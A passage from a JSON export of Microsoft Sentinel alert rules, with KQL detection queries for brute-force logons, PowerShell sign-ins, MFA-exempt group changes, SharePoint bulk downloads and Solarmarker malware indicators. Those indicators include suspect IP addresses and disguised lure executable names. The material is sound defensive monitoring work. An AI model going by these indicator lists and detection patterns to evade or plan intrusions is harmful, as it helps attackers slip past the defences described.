Facility, ProcessName, Reason;\n//See if any of these IPs have sucessfully logged into Windows hosts\nlet win_logons =\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID == 4624\n| where LogonType in (10, 7, 3)\n| where IpAddress != \"-\"\n| where IpAddress in (suspicious_signins)\n| extend Reason = \"Multiple failed AAD logins from IP address\"\n| project TimeGenerated, Account, AccountType, Computer, Activity, EventID, LogonProcessName, IpAddress, LogonTypeName, TargetUserSid, Reason;\nunion isfuzzy=true linux_logons,win_logons\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, IPCustomEntity = IpAddress, HostCustomEntity = Computer","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","CredentialAccess"],"techniques":["T1078","T1110"],"displayName":"Failed AzureAD logons but success logon to host","enabled":false,"description":"Identifies a list of IP addresses with a minimum number (default of 5) of failed logon attempts to Azure Active Directory.\nUses that list to identify any successful remote logons to hosts from these IPs within the same timeframe.","alertRuleTemplateName":"8ee967a2-a645-4832-85f4-72b635bcb3a6","lastModifiedUtc":"2022-05-03T18:15:40.319699Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1f0c3ef8-b6d7-46b9-aff3-1c0c6943d27a","name":"1f0c3ef8-b6d7-46b9-aff3-1c0c6943d27a","etag":"\"88008918-0000-2700-0000-66fdce4f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let auditLookback = 1h;\nSigninLogs\n| where TimeGenerated > ago(auditLookback)\n| where AppId =~ \"1b730954-1685-4b74-9bfd-dac224a7b894\" // AppDisplayName IS Azure Active Directory PowerShell\n| where TokenIssuerType =~ \"AzureAD\"\n| where ResourceIdentity !in (\"00000002-0000-0000-c000-000000000000\", \"00000003-0000-0000-c000-000000000000\") // ResourceDisplayName IS NOT Windows Azure Active Directory OR Microsoft Graph\n| where Status.errorCode == 0 // Success\n| project-reorder IPAddress, UserAgent, ResourceDisplayName, UserDisplayName, UserId, UserPrincipalName\n| order by TimeGenerated desc\n// New entity mapping\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Azure Active Directory PowerShell accessing non-AAD resources","enabled":true,"description":"This will alert when a user or application signs in using Azure Active Directory PowerShell to access non-Active Directory resources, such as the Azure Key Vault, which may be undesired or unauthorized behavior.\nFor capabilities and expected behavior of the Azure Active Directory PowerShell module, see: https://docs.microsoft.com/powershell/module/azuread/?view=azureadps-2.0.\nFor further information on Azure Active Directory Signin activity reports, see: https://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0002;T1059;T1059.009,TA0005;T1548;T1548.005","alertRuleTemplateName":"50574fac-f8d1-4395-81c7-78a463ff0c52","lastModifiedUtc":"2024-10-02T22:50:50.3372012Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/910184ec-2bbe-4741-ad0e-5df7fc984e64","name":"910184ec-2bbe-4741-ad0e-5df7fc984e64","etag":"\"0200b619-0000-2700-0000-624904e80000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P7D","queryPeriod":"P14D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let detectionTime = 30d;\nlet User_Agents = dynamic ([\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70\", \n\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.1 Safari/605.1.15\", \n\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\", \n\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\", \n\"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\"]);\nOfficeActivity\n| where TimeGenerated > ago(detectionTime)\n| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\") \n| where Operation != 'UserLoggedIn'\n| extend UserAgent = iff(parse_json(ExtendedProperties)[0].Name =~ \"UserAgent\", extractjson(\"$[0].Value\", ExtendedProperties, typeof(string)),\"\")\n| mv-expand parse_json(ExtendedProperties)\n| where ExtendedProperties.Name =~ \"RequestType\"\n| extend RequestType = todynamic(ExtendedProperties).Value\n| where UserAgent =~ \"ms-office\" or UserAgent has_any (User_Agents)\n| summarize authAttempts=dcount(TimeGenerated), firstAttempt=min(TimeGenerated), lastAttempt=max(TimeGenerated), uniqueIPs=dcount(ClientIP), uniqueAccounts=dcount(UserId), attemptedAccounts=make_set(UserId) by UserAgent\n| where authAttempts > 500\n| extend timestamp = firstAttempt\n| sort by uniqueAccounts","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"uniqueAccounts"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"uniqueIPs"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"Possible STRONTIUM attempted credential harvesting - Oct 2020","enabled":false,"description":"Surfaces potential STRONTIUM group Office365 credential harvesting attempts within OfficeActivity Logon events.","alertRuleTemplateName":"68271db2-cbe9-4009-b1d3-bb3b5fe5713c","lastModifiedUtc":"2022-03-21T11:39:50.2984702Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7b228c5d-6229-42d9-8b25-f7aa2f86a529","name":"7b228c5d-6229-42d9-8b25-f7aa2f86a529","etag":"\"fd00f038-0000-2700-0000-633ebdfe0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let Alert1 = \nSecurityAlert\n| where AlertName == \"Unfamiliar sign-in properties\"\n| extend UserPrincipalName = tostring(parse_json(ExtendedProperties).[\"User Account\"])\n| extend Alert1Time = TimeGenerated\n| extend Alert1 = AlertName\n| extend Alert1Severity = AlertSeverity;\nlet Alert2 = \nSecurityAlert\n| where AlertName == \"Atypical travel\"\n| extend UserPrincipalName = tostring(parse_json(ExtendedProperties).[\"User Account\"])\n| extend Alert2Time = TimeGenerated\n| extend Alert2 = AlertName\n| extend Alert2Severity = AlertSeverity\n| extend CurrentLocation = parse_json(ExtendedProperties)['Current Location']\n| extend PreviousLocation = iif(isempty(parse_json(ExtendedProperties)['Previous Location']),\"Not Listed\",parse_json(ExtendedProperties)['Previous Location'])\n| extend CurrentIPAddress = parse_json(ExtendedProperties)['Current IP Address']\n| extend PreviousIPAddress = parse_json(ExtendedProperties)['Previous IP Address']\n;\nAlert1\n| join kind=inner Alert2 on UserPrincipalName\n| where abs(datetime_diff('minute', Alert1Time, Alert2Time)) <=10\n| extend TimeDelta = Alert1Time - Alert2Time\n| project Alert1Time, UserPrincipalName, Alert1,  Alert1Severity, Alert2, Alert2Time, Alert2Severity, TimeDelta, CurrentLocation, PreviousLocation, CurrentIPAddress, PreviousIPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"CurrentIPAddress"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"Correlate Unfamiliar sign-in properties and atypical travel alerts","enabled":false,"description":"When a user has both an Unfamiliar sign-in properties alert and an Atypical travel alert within 20 minutes, the alert should be handled with a higher severity. Simplified the json parsing. Pulled as much relevant information as I could to fill in the missing entries. V 2.0","alertRuleTemplateName":"a3df4a32-4805-4c6d-8699-f3c888af2f67","lastModifiedUtc":"2022-10-06T11:37:34.5878379Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5996717f-a3d4-478e-b203-897aaa57fa3d","name":"5996717f-a3d4-478e-b203-897aaa57fa3d","etag":"\"bb006364-0000-2700-0000-64380b010000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"MicrosoftSecurityIncidentCreation","properties":{"productFilter":"Azure Active Directory Identity Protection","severitiesFilter":["High"],"displayNamesFilter":null,"displayNamesExcludeFilter":null,"displayName":"Create incidents based on Azure Active Directory Identity Protection alerts","enabled":false,"description":"Create incidents based on all alerts generated in Azure Active Directory Identity Protection","alertRuleTemplateName":"532c1811-79ee-4d9f-8d4d-6304c840daa1","lastModifiedUtc":"2023-04-13T14:00:33.7295008Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fc4475fd-4a3a-4531-98d3-f30cb258b0fe","name":"fc4475fd-4a3a-4531-98d3-f30cb258b0fe","etag":"\"8700c22a-0000-2700-0000-66fdbe7c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"AuditLogs\r\n| where OperationName contains \"Add member to group\" or OperationName contains \"Remove member from group\"\r\n| extend groupName = iif(isnotnull(parse_json(TargetResources[0].modifiedProperties[1].newValue)), parse_json(TargetResources[0].modifiedProperties[1].newValue), parse_json(TargetResources[0].modifiedProperties[1].oldValue))\r\n| extend newAccount = tostring(parse_json(TargetResources[0].userPrincipalName))\r\n| extend newAccount = iif(isnotempty(newAccount), newAccount, strcat(\"Guest User ID: \", tostring(parse_json(TargetResources[0].id))))\r\n| extend initiatedBy = parse_json(InitiatedBy.user.userPrincipalName)\r\n| where groupName contains \"MFA Exempt Users\"\r\n| project\r\n    TimeGenerated,\r\n    groupName,\r\n    newAccount,\r\n    initiatedBy,\r\n    OperationName,\r\n    Result,\r\n    ResultReason","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"newAccount"}]},{"entityType":"SecurityGroup","fieldMappings":[{"identifier":"DistinguishedName","columnName":"groupName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"initiatedBy"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CommandAndControl"],"techniques":["T1204","T1059","T1071"],"displayName":"MFA exempt account added or removed v2","enabled":true,"description":"Identifies any account that is added to or removed from the \"MFA Exempt Users\" security group. The \"MFA Exempt Users\" group allows a user account to authenticate without the use of MFA.\n\nExecution, Command and Control, Discovery\n\nT1204- User Execution:T1204.002, T1059- Command and Scripting Interpreter:T1059.001,T1059.003, T1064: Scripting, T1071: Application Layer Protocol\nPLATFORM:Azure AD,IaaS,Microsoft 365,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0003;T1098;T1098.001;T1098.003,TA0004;T1098;T1098.003,TA0005;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:43:23.1485164Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/e358bba9-1da4-4496-9629-b9407283e7b2","name":"e358bba9-1da4-4496-9629-b9407283e7b2","etag":"\"d600a9ad-0000-2700-0000-65a7ce3c0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"let IPsuspect = dynamic([\"92.204.160.114\", \"46.102.152.102\", \"89.44.9.189\", \"178.132.7.118\", \"185.236.203.153\", \"37.120.237.251\", \"91.241.19.21\", \"146.70.41.157\", \"45.135.232.131\", \"84.252.95.225\",\"89.44.9.108\",\"5.254.118.226\",\"37.120.247.199\",\"69.46.15.151\",\"37.120.237.251\",\"146.70.101.97\",\"146.70.24.173\",\"188.241.83.61\",\"185.244.213.64\",\"45.42.201.248\",    \"216.230.232.134\",\"46.102.152.102\",\"146.70.53.153\",\"146.70.88.119\",\"37.221.113.115\",\"92.204.160.114\",\"92.204.160.101\"]);\r\nlet Filesuspect = dynamic([\"Optumrx-Quantity-Limit-Prior-Authorization-Form.exe\", \r\n\"Fedex-Domestic-Air-Waybill.exe\", \r\n\"Osha-Required-Training-Checklist-For-General-Industry.exe\", \r\n\"Thetford Porta Potti 345 Instructions.exe\", \r\n\"Parkland-Heritage-Gazebo-Instructions.exe\", \r\n\"Howard-County-Refinance-Affidavit.exe\", \r\n\"Checklist-For-Bringing-New-Baby-Home.exe\", \r\n\"Pool-Cover-Cable-Winch-Instructions.exe\", \r\n\"Radiation-Pregnancy-Consent-Form.exe\", \r\n\"Rival-Frozen-Delights-Ice-Cream-Maker-Manual.exe\", \r\n\"Ford-Direct-Window-Sticker-Lookup.exe\", \r\n\"Sentence-Structure-Simple-Compound-Complex-Worksheets.exe\", \r\n\"Adrenal-Protocol-Ct-Washout.exe\", \r\n\"Osha-Propane-Tank-Storage-Requirements.exe\", \r\n\"Indiana-Alcohol-And-Tobacco-Liquor-License-Renewal.exe\", \r\n\"Monthly-Elevator-Inspection-Checklist.exe\", \r\n\"Family-Nurse-Practitioner-Certification-Exam-Questions.exe\", \r\n\"Iai-Latent-Print-Certification-Test-Preparation-Training.exe\", \r\n\"Cornwall-Ontario-Pool-Bylaw.exe\", \r\n\"State-Of-Michigan-Workmans-Comp-Waiver.exe\", \r\n\"Lilly-Cares-Patient-Assistance-Application-Form.exe\", \r\n\"Market-Adjustment-Salary-Increase-Letter.exe\", \r\n\"Are-Doctors-Obligated-By-Law-To-Perform-A-Surgery.exe\", \r\n\"Affidavit-Of-Correction-South-Carolina.exe\", \r\n\"Medicare-Annual-Wellness-Visit-Questionnaire-In-Spanish.exe\", \r\n\"Acceptance-Letter-Phd-Neuroscience.exe\", \r\n\"Cigna-Precertification-Request-Form.exe\", \r\n\"Oregon-Inheritance-Tax-Waiver-Form.exe\", \r\n\"Religious-Exemption-Letter-Nj-Example.exe\", \r\n\"Training-Needs-Analysis-Questionnaire-For-Employees.exe\", \r\n\"Sample-Texas-Will-And-Testament.exe\", \r\n\"Matter-As-Particles-Worksheet.exe\", \r\n\"Sdlc-Life-Cycle-With-Examples.exe\", \r\n\"Randall-High-School-Volleyball-Schedule.exe\", \r\n\"Uses-Of-Rocks-Worksheet.exe\", \r\n\"Sample-Demand-Letter-For-Services-Not-Rendered.exe\", \r\n\"Fe-Exam-Review-Lecture-Notes.exe\", \r\n\"Quit-Claim-Deed-Form-Volusia-County-Florida.exe\", \r\n\"Imsa-Ite-Traffic-Signal-Maintenance-Handbook.exe\", \r\n\"Capital-One-Mortgage-Pre-Approval.exe\", \r\n\"Field-Trip-Reflection-Worksheet-Pdf.exe\", \r\n\"Livingston-Mt-City-Court-Warrants-List.exe\", \r\n\"One-Page-Lease-Agreement-Texas.exe\", \r\n\"Thetford Porta Potti 345 Instructions.exe\", \r\n\"Howard-County-Refinance-Affidavit.exe\", \r\n\"Checklist-For-Bringing-New-Baby-Home.exe\", \r\n\"Example Of Discharge Summary For Substance Abuse\"]);\r\nOfficeActivity\r\n| where TimeGenerated >= ago(1d)\r\n| where (isnotempty(UserAgent) and ClientIP in~ (IPsuspect)) or \r\n    SourceFileName has_any (\"petition-for-declaratory\", \"judgment-missouri\") or SourceFileName in~ (Filesuspect)\r\n| project\r\n    SourceIP = ClientIP,\r\n    Account = UserId,\r\n    Type,\r\n    RecordType,\r\n    OfficeWorkload,\r\n    UserAgent,\r\n    OfficeObjectId,\r\n    IPMatch = \"ClientIP\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"Account"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"SourceIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":[],"displayName":"Solarmarker","enabled":true,"description":"The analytic that looks for the IP addresses associated to Solarmarker v3. Added IP and file names to analytic included in a new CrowdStrike alert.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-17T12:55:24.0073438Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1625655d-8f8d-424a-a454-70f554ccfe0b","name":"1625655d-8f8d-424a-a454-70f554ccfe0b","etag":"\"d600a59c-0000-2700-0000-65a7cdda0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Looks for Guest accounts authenticating to access/execute a PowerShell app.\r\nSigninLogs\r\n| where TimeGenerated >= ago(24h)\r\n| where UserType == \"Guest\"\r\n// AppDisplayName has several variations of \"PowerShell\".  This is a catch-all.\r\n| where AppDisplayName contains \"PowerShell\"\r\n// Extend both AccountCustomEntity and IPCustomEntity so the populate within the \"Entities\" pane.\r\n| extend AccountCustomEntity = UserPrincipalName, IPCustomEntity = IPAddress","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Reconnaissance"],"techniques":[],"displayName":"PowerShell activity from a Guest account","enabled":true,"description":"This analytic looks for any authentication from a guest account where the user is accessing a PowerShell-related resource.  Guest accounts should not be accessing or executing PowerShell resources within the environment.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-17T12:53:45.4097653Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8715cd4d-ed95-468a-8fd4-d63f4c50a09e","name":"8715cd4d-ed95-468a-8fd4-d63f4c50a09e","etag":"\"f304be3c-0000-2700-0000-62b99c250000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P2D","queryPeriod":"P2D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let lookback = ago(2d);\r\n// Set the watchlist variable.\r\nlet LinodeTable = _GetWatchlist('LinodeIPs');\r\nSigninLogs\r\n| where TimeGenerated >= lookback\r\n| distinct IPAddress\r\n// SearchKey is the field provided from the Watchlist.  It is a CIDR notated IPv4 range.  The IPv6 values are ignored.\r\n| evaluate ipv4_lookup(LinodeTable, IPAddress, SearchKey, return_unmatched = false)\r\n// It was faster to 1) look at distinct IPs 2) use ipv4_lookup and 3) join the rest of the details, than it would have normally taken.\r\n| join kind=inner (\r\n    SigninLogs\r\n    | where TimeGenerated >= lookback\r\n    | extend AdditionalDetails = tostring(Status.additionalDetails)\r\n    | summarize make_set(AdditionalDetails), min(TimeGenerated), max(TimeGenerated) by IPAddress, UserPrincipalName\r\n) on IPAddress\r\n| extend\r\n    timestamp = min_TimeGenerated,\r\n    AccountCustomEntity = UserPrincipalName,\r\n    IPCustomEntity = IPAddress,\r\n    LinodeNetwork = SearchKey\r\n| project IPCustomEntity, AccountCustomEntity, timestamp, max_TimeGenerated, set_AdditionalDetails, LinodeNetwork","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":[],"displayName":"Sign-ins from Linode-owned IPs","enabled":false,"description":"Looks for Sign-ins where the source IP is one that is owned by Linode.  Results do not automatically indicate malicious intent as VPNs are permitted for certain uses.  When investigating, look at the success/fail of the attempt, if conditional access policies resulted in failures, and OfficeActivity, to determine anomylous user behavior.","alertRuleTemplateName":null,"lastModifiedUtc":"2022-06-27T12:01:41.3688889Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/72f50721-4261-47eb-83de-c84109122a0a","name":"72f50721-4261-47eb-83de-c84109122a0a","etag":"\"d600d469-0000-2700-0000-65a7cc890000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// Look within the OfficeActivity table for 'FileDownloaded' operations across multiple SharePoint sites.\r\nlet DownloadActivity = OfficeActivity\r\n    | where TimeGenerated >= ago(24h)\r\n    | where Operation == \"FileDownloaded\"\r\n    // Documents that are uploaded and shared within teams will reside in a 'SourceRelativeUrl' of \"Documents/Microsoft Teams Chat Files\"\r\n    // These are excluded because they are not the type of data-exfiltration indication that we are looking for.\r\n    | where SourceRelativeUrl != \"Documents/Microsoft Teams Chat Files\";\r\nDownloadActivity\r\n// Deduplicate Site_Urls (based around the individual accessing) so we can count the unique sites.\r\n| distinct UserId, Site_Url\r\n// Count the number of sites and create a list of them with a maximum number (required of 1000 - which we will probably never hit).\r\n| summarize Sites = make_set(Site_Url, 1000), SiteCount = count() by UserId\r\n// Join the following table to the table we created above.  The join kind is innerunique (see Microsoft Documentation for clarification).\r\n| join kind=innerunique (\r\n    // Look for the same activity but grab the total number of downloaded files.\r\n    DownloadActivity\r\n    // We perform a distinct here and include TimeGenerated because duplication of logs can occur and will affect the count.\r\n    | distinct UserId, OfficeObjectId\r\n    // This will result in a table with UserId and DownloadCount\r\n    | summarize DownloadCount = count() by UserId\r\n    // The tables join on the field 'UserId'\r\n    )\r\n    on UserId\r\n// The threshold we set for SiteCount is 4 (within our time window).  This can change, we have to find a balance of\r\n// data-exfil indication and not working events for normal activity.\r\n| where SiteCount >= 4\r\n| where DownloadCount >= 10\r\n// Create our final table based on the following fields.\r\n| project UserId, DownloadCount, SiteCount, Sites\r\n// Commented out extend below as not needed\r\n//| extend AccountCustomEntity = UserId\r\n// Added join of IdentityInfo to pull user's Department and most current GroupMemberships for comparison to download activity\r\n| join (IdentityInfo\r\n    | where TimeGenerated >= ago(30d)\r\n    | distinct AccountUPN, Department, tostring(GroupMembership))\r\n    on ($left.UserId == $right.AccountUPN)\r\n| summarize GroupMembership = make_list(GroupMembership) by UserId, DownloadCount, SiteCount, tostring(Sites), Department\r\n| project\r\n    UserId,\r\n    Department,\r\n    DownloadCount,\r\n    SiteCount,\r\n    Sites,\r\n    MostCurrentGroupMembership= GroupMembership.[0]","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"MostCurrentGroupMembership"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"Downloads Across Multiple SharePoint Sites v3","enabled":true,"description":" Commented out an unneeded extend.\nJoined the IdentityInfo table to lookup User's Department and most recent group memberships.\nThis will allow the analyst to do a comparison of sites downloaded from to their department and the most recent Sharepoint sites that they are a member of, that have been processed in the past 30 days.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-01-17T12:48:09.2454109Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5ca81048-439a-499e-a880-983c8dd487a1","name":"5ca81048-439a-499e-a880-983c8dd487a1","etag":"\"0a144244-0000-2700-0000-6758a6540000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT8H","queryPeriod":"PT8H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.\r\nlet timeframe = 8h;\r\nlet exclusions = dynamic([\"SpoolsProvisioning-ApplicationAccount@NAMP111.PROD.OUTLOOK.COM,52.182.49.149\", \"SpoolsProvisioning-ApplicationAccount@NAMP111.PROD.OUTLOOK.COM,52.182.49.195\"]);\r\n// This filters records that have \"UserSMimeCertificate\", \"UserCertificate\", and \"ForwardingSmtpAddress\" fields in the Parameters. These do not appear to have a security importance as the fields are blank. The first two *may* be related to migrations. Forwarding is disabled to external domains.\r\nlet ParamsExcluded = dynamic([\"UserSMimeCertificate\", \"UserCertificate\", \"ForwardingSmtpAddress\"]);\r\nlet main =OfficeActivity\r\n    | where TimeGenerated >= ago(timeframe)\r\n    | where Operation in~ (\"Add-MailboxPermission\", \"Add-MailboxFolderPermission\", \"Set-Mailbox\", \"New-ManagementRoleAssignment\")\r\n        and not(UserId has_any ('NT AUTHORITY\\\\SYSTEM (Microsoft.Exchange.AdminApi.NetCore)', 'NT AUTHORITY\\\\SYSTEM (Microsoft.Exchange.ServiceHost)', 'ECAF', 'NT AUTHORITY\\\\SYSTEM (w3wp)', 'devilfish-applicationaccount') and Operation in~ (\"Add-MailboxPermission\", \"Set-Mailbox\"))\r\n    | extend timestamp = TimeGenerated, InitiatedBy = UserId, ActionAccountSrcIP = ClientIP\r\n    | project\r\n        TimeGenerated,\r\n        InitiatedByIP = iff(ClientIP contains_cs \":\", split(ClientIP, \":\")[0], split(ClientIP, \"-\")[0]),\r\n        ActionAccountSrcIP,\r\n        InitiatedBy,\r\n        RecordType,\r\n        Operation,\r\n        TargetedMbx = OfficeObjectId,\r\n        ParamsModified = 